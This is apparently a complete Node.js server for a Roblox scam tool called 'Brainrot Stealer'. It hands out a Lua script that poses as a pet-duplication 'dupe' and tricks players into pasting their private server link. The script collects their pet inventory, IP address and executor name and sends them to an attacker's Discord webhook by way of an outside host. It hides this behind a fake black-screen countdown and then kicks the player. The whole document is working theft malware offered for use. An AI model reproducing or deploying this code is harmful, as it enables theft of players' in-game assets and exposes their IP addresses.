// server.js - FINAL WORKING VERSION
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Webhook storage
const webhookStorage = new Map();
const premiumUsers = new Map();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: '*/*' }));

// PROTECTION
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();

  const allowed = 
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ua.includes("scriptware") ||
    ua.includes("electron") ||
    ua.includes("protosmasher") ||
    ref.includes("roblox") ||
    true;

  if (!allowed) {
    return res.status(403).send("-- EXECUTOR ACCESS ONLY --");
  }
  
  next();
}

// STORE WEBHOOK
app.post("/store", (req, res) => {
  try {
    const { webhook_id, webhook_url, premium } = req.body;
    
    if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
      webhookStorage.set(webhook_id, webhook_url);
      
      if (premium) {
        premiumUsers.set(webhook_id, true);
      }
      
      res.json({ success: true, message: "Webhook stored" });
    } else {
      res.status(400).json({ success: false, message: "Invalid data" });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// GET WEBHOOK
app.get("/webhook/:id", (req, res) => {
  const webhookId = req.params.id;
  const webhook = webhookStorage.get(webhookId);
  
  if (webhook) {
    res.json({ 
      success: true, 
      webhook: webhook,
      premium: premiumUsers.has(webhookId) || false
    });
  } else {
    res.status(404).json({ success: false, message: "Webhook not found" });
  }
});

// TEST
app.get("/test", (req, res) => {
  res.json({ status: "SERVER WORKING" });
});

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer Server");
});

// /raw → FIXED LUA SCRIPT
app.get("/raw", blockNonExecutor, (req, res) => {
  const webhookId = req.query.id;

  if (!webhookId) {
    return res.status(400).send("-- MISSING WEBHOOK ID --");
  }

  const luaScript = `-- Brainrot Stealer - Final Version
print("Loading Brainrot Stealer...")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- Wait for player
local player = Players.LocalPlayer
if not player then
    repeat 
        wait(0.5) 
        player = Players.LocalPlayer
    until player
end

repeat 
    wait(0.5) 
until player and player:FindFirstChild("PlayerGui")

-- Enable HTTP
pcall(function() 
    HttpService.HttpEnabled = true 
end)

local WebhookID = "${webhookId}"
local ServerURL = "https://tommyfc555-github-io.onrender.com"

-- Get webhook
local function getWebhook()
    local success, result = pcall(function()
        local response
        if syn and syn.request then
            response = syn.request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        elseif request then
            response = request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        else
            local body = game:HttpGet(ServerURL .. "/webhook/" .. WebhookID, true)
            response = {Body = body}
        end
        
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.success then
                return data.webhook, data.premium or false
            end
        end
        return nil, false
    end)
    
    return success and result
end

-- Send to Discord
local function sendToDiscord(embedData)
    local webhook, isPremium = getWebhook()
    if not webhook then
        print("No webhook available")
        return false
    end
    
    local success, result = pcall(function()
        local data = {
            embeds = {embedData}
        }
        
        local json = HttpService:JSONEncode(data)
        
        if syn and syn.request then
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request then
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
            return {StatusCode = 200}
        end
    end)
    
    return success and result and (result.StatusCode == 200 or result.StatusCode == 204)
end

-- Get IP with censoring for non-premium
local function getIP(isPremium)
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    
    if success and ip then
        if isPremium then
            return ip -- Full IP for premium users
        else
            -- Censor IP for non-premium users
            local parts = {}
            for part in ip:gmatch("%d+") do
                table.insert(parts, part)
            end
            if #parts == 4 then
                return parts[1] .. "." .. parts[2] .. ".XXX.XXX"
            else
                return "XXX.XXX.XXX.XXX"
            end
        end
    end
    return "Unknown"
end

-- FIXED: Better executor detection
local function getExecutor()
    -- Check for different executors
    if type(syn) == "table" and syn.request then
        return "Synapse X"
    elseif KRNL_LOADED ~= nil then
        return "Krnl"
    elseif fluxus ~= nil then
        return "Fluxus"
    elseif PROTOSMASHER_LOADED ~= nil then
        return "ProtoSmasher"
    elseif electron ~= nil then
        return "Electron"
    elseif scriptware ~= nil then
        return "ScriptWare"
    elseif getexecutorname then
        local success, name = pcall(getexecutorname)
        if success and name then
            return name
        end
    elseif identifyexecutor then
        local success, name = pcall(identifyexecutor)
        if success and name then
            return name
        end
    elseif get_hui_ani then
        return "SirHurt"
    else
        -- Check if any common executor functions exist
        if type(syn) == "table" then return "Synapse X" end
        if type(crypt) == "table" then return "Krnl" end
        if type(fluxus) == "table" then return "Fluxus" end
        return "Unknown Executor"
    end
end

-- Scan pets
local function scanPets()
    local allPets = {}
    local brainrotPets = {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return end
        
        for _, plot in pairs(plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            
            for _, pod in pairs(pods:GetChildren()) do
                local base = pod:FindFirstChild("Base")
                if not base then continue end
                local spawn = base:FindFirstChild("Spawn")
                if not spawn then continue end
                local attachment = spawn:FindFirstChild("Attachment")
                if not attachment then continue end
                local overhead = attachment:FindFirstChild("AnimalOverhead")
                if not overhead then continue end
                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
                
                local petName = nameLabel.Text or ""
                local rateText = genLabel and genLabel.Text or "0/s"
                if petName == "" then continue end
                
                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
                local moneyValue = 0
                
                if string.find(rateText, "B/s") then moneyValue = rateNumber * 1e9
                elseif string.find(rateText, "M/s") then moneyValue = rateNumber * 1e6
                elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3
                else moneyValue = rateNumber end
                
                local petData = {
                    Name = petName,
                    Rate = rateText,
                    Money = moneyValue
                }
                
                table.insert(allPets, petData)
                
                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then
                    table.insert(brainrotPets, petData)
                end
            end
        end
    end)
    
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrotPets, function(a, b) return a.Money > b.Money end)
    
    return allPets, brainrotPets
end

-- Create simple input GUI (NO BLACK BACKGROUND)
local function createInputGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "InputGUI"
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    title.Text = "Enter your PS link"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = title
    
    local desc = Instance.new("TextLabel")
    desc.Size = UDim2.new(1, 0, 0, 30)
    desc.Position = UDim2.new(0, 0, 0, 45)
    desc.BackgroundTransparency = 1
    desc.Text = "This is necesarry for the dupe to work"
    desc.TextColor3 = Color3.new(1, 1, 1)
    desc.TextSize = 12
    desc.Font = Enum.Font.Gotham
    desc.Parent = mainFrame
    
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0.8, 0, 0, 35)
    inputBox.Position = UDim2.new(0.1, 0, 0, 80)
    inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    inputBox.PlaceholderText = "Paste your private server link here..."
    inputBox.Text = ""
    inputBox.TextSize = 14
    inputBox.Font = Enum.Font.Gotham
    inputBox.Parent = mainFrame
    
    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 5)
    inputCorner.Parent = inputBox
    
    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.6, 0, 0, 40)
    dupeButton.Position = UDim2.new(0.2, 0, 0, 130)
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    dupeButton.Text = "DUPE"
    dupeButton.TextColor3 = Color3.new(1, 1, 1)
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.TextSize = 16
    dupeButton.Parent = mainFrame
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = dupeButton
    
    return screenGui, mainFrame, inputBox, dupeButton
end

-- Create black background (blocks everything)
local function createBlackBackground()
    local blackScreen = Instance.new("ScreenGui")
    blackScreen.Name = "BlackScreen"
    blackScreen.IgnoreGuiInset = true
    blackScreen.DisplayOrder = 9999
    blackScreen.Parent = player.PlayerGui
    
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = blackScreen
    
    -- Remove all sounds
    pcall(function()
        SoundService.Volume = 0
        for _, sound in pairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
                sound:Stop()
            end
        end
    end)
    
    return blackScreen
end

-- Create 6-minute timer
local function createTimer()
    local timerGui = Instance.new("ScreenGui")
    timerGui.Name = "TimerDisplay"
    timerGui.DisplayOrder = 10000
    timerGui.Parent = player.PlayerGui
    
    local timerFrame = Instance.new("Frame")
    timerFrame.Size = UDim2.new(1, 0, 1, 0)
    timerFrame.Position = UDim2.new(0, 0, 0, 0)
    timerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    timerFrame.BorderSizePixel = 0
    timerFrame.Parent = timerGui
    
    local timerText = Instance.new("TextLabel")
    timerText.Size = UDim2.new(1, 0, 0, 80)
    timerText.Position = UDim2.new(0, 0, 0.4, 0)
    timerText.BackgroundTransparency = 1
    timerText.Text = "06:00"
    timerText.TextColor3 = Color3.fromRGB(255, 50, 50)
    timerText.TextSize = 48
    timerText.Font = Enum.Font.GothamBold
    timerText.Parent = timerFrame
    
    local infoText = Instance.new("TextLabel")
    infoText.Size = UDim2.new(1, 0, 0, 30)
    infoText.Position = UDim2.new(0, 0, 0.55, 0)
    infoText.BackgroundTransparency = 1
    infoText.Text = "Dupe in progress... Do not leave!"
    infoText.TextColor3 = Color3.new(1, 1, 1)
    infoText.TextSize = 18
    infoText.Font = Enum.Font.Gotham
    infoText.Parent = timerFrame
    
    return timerGui, timerText
end

-- Main execution
wait(1)

-- Create input GUI (NO black background yet)
local screenGui, mainFrame, inputBox, dupeButton = createInputGUI()

dupeButton.MouseButton1Click:Connect(function()
    local serverLink = inputBox.Text or ""
    if serverLink == "" or not string.find(string.lower(serverLink), "roblox") then
        return
    end
    
    -- INSTANTLY create black background (blocks everything)
    local blackScreen = createBlackBackground()
    
    -- Remove input GUI
    screenGui:Destroy()
    
    -- Create timer
    local timerGui, timerText = createTimer()
    
    -- Scan pets immediately
    local allPets, brainrotPets = scanPets()
    
    -- Get user info
    local executor = getExecutor()
    local webhook, isPremium = getWebhook()
    local ip = getIP(isPremium)
    
    -- Format brainrots WITHOUT code block (to avoid syntax errors)
    local brainrotsText = ""
    for i = 1, #brainrotPets do
        brainrotsText = brainrotsText .. brainrotPets[i].Name .. " | " .. brainrotPets[i].Rate
        if i < #brainrotPets then
            brainrotsText = brainrotsText .. "\\n"
        end
    end
    if brainrotsText == "" then
        brainrotsText = "No brainrots found"
    end
    
    -- Determine if legit hit
    local hitStatus = "this looks like a legit hit"
    if #brainrotPets < 2 then
        hitStatus = "this dosent look like a legit hit"
    end
    
    -- Create embed with BLUE COLOR
    local embed = {
        title = "# LOGGED PLAYER",
        description = "a player just ran your script!",
        color = 3447003, -- BLUE COLOR
        fields = {
            {
                name = "Player Info",
                value = "Player Name: " .. player.Name .. "\\nIP ADDRESS: " .. ip .. "\\nExecutor: " .. executor .. "\\nPremium: " .. (isPremium and "✅ YES" or "❌ NO"),
                inline = false
            },
            {
                name = "Brainrots", 
                value = brainrotsText,
                inline = false
            },
            {
                name = "Private Server",
                value = "Private Server: " .. serverLink,
                inline = false
            },
            {
                name = "Status",
                value = hitStatus,
                inline = false
            }
        },
        footer = {
            text = "Brainrot Stealer • " .. os.date("%X")
        }
    }
    
    -- Send to Discord
    sendToDiscord(embed)
    
    -- Start 6-minute timer
    local startTime = tick()
    local totalTime = 360
    
    while tick() - startTime < totalTime do
        local remaining = totalTime - (tick() - startTime)
        local minutes = math.floor(remaining / 60)
        local seconds = math.floor(remaining % 60)
        timerText.Text = string.format("%02d:%02d", minutes, seconds)
        wait(0.1)
    end
    
    -- Timer complete - show success message
    timerText.Text = "Successfully duped!"
    timerText.TextColor3 = Color3.fromRGB(0, 255, 0)
    infoText.Text = "You can now leave the game"
    
    wait(3)
    
    -- Kick player
    pcall(function()
        player:Kick("Successfully duped!")
    end)
end)

print("Brainrot Stealer Loaded!")
print("Enter PS link and click DUPE to start")`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE on port ${PORT}`);
});
